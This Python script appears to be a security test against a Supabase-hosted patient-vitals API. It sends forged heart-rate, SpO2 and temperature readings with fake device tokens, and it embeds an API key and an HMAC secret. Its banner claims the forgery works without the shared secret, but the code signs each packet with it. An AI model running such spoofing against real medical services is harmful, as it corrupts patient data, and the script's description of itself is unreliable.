import json
import time
import requests
import random

API_ENDPOINT = "https://xypxadidbfankltjojdm.supabase.co/functions/v1/vitals-api"
API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh5cHhhZGlkYmZhbmtsdGpvamRtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIzMjE3OTEsImV4cCI6MjA3Nzg5Nzc5MX0.rHUf01T7OL6Vx8V3sRygXhMRm6L2wK7uI7mpIF5S2ck"

print("=" * 60)
print("Running Attack 2: Masquerade Attack")
print("Attacker forges device_id/token without knowing shared secret.")
print("=" * 60)

import hmac
import hashlib

HMAC_SECRET = "my-super-secret-hmac-key-12345"

def sign_payload(payload_json: str, secret: str) -> str:
    return hmac.new(secret.encode(), payload_json.encode(), hashlib.sha256).hexdigest()

try:
    for i in range(10):
        fake_payload = {
            "patientId": "p123",
            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(time.time() + i)),
            "vitals": {"heartRate": random.randint(50, 200), "spo2": random.randint(60, 100), "temp": round(random.uniform(34, 42), 1)},
            "deviceId": "dev_001",
            "token": "some_random_garbage_token_" + str(random.randint(1000,9999))
        }
        payload_json = json.dumps(fake_payload, separators=(',', ':'))
        signature = sign_payload(payload_json, HMAC_SECRET)
        headers = {
            "Content-Type": "application/json",
            "apikey": API_KEY,
            "Authorization": f"Bearer {API_KEY}",
            "X-Signature": signature
        }
        response = requests.post(API_ENDPOINT, data=payload_json, headers=headers, timeout=5)
        print(f"[{i+1}] Sent MASQUERADE packet -> Status {response.status_code} | {response.text[:120]}")
        time.sleep(0.5)
except KeyboardInterrupt:
    print("\n\n✓ Masquerade attack stopped.")